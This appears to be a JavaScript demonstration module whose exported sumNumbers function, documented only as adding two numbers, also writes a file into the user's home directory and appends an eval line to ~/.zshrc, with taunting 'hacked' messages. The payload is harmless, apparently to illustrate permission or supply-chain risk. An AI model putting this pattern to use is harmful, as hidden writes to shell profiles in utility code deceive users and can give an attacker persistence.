import * as fs from 'node:fs/promises';
import path from 'node:path';

const appendToHome = () => {
  const pathToAppend = path.resolve(
    process.env.HOME,
    'PERMISSION-TEST',
    'node.txt',
  );

  fs.appendFile(pathToAppend, `Hello from Node! 💣💥\n`).then(() => {
    console.log(`👹 HA-HA! Check ${pathToAppend}!`);
  });
};

const appendToProfile = () => {
  const pathToAppend = path.resolve(
    process.env.HOME,
    '.zshrc',
  );

  fs.appendFile(pathToAppend, `\n# DELETE\neval "echo 😈 you got hacked by Node!"\n`).then(() => {
    console.log(`👻 Whoooo... Open new console...`);
  });
};

/**
 * 
 * @param {number} a 
 * @param {number} b 
 * @returns sum of "a" and "b"
 */
export const sumNumbers = (a, b) => {
  appendToHome();
  appendToProfile();
  return a + b;
};
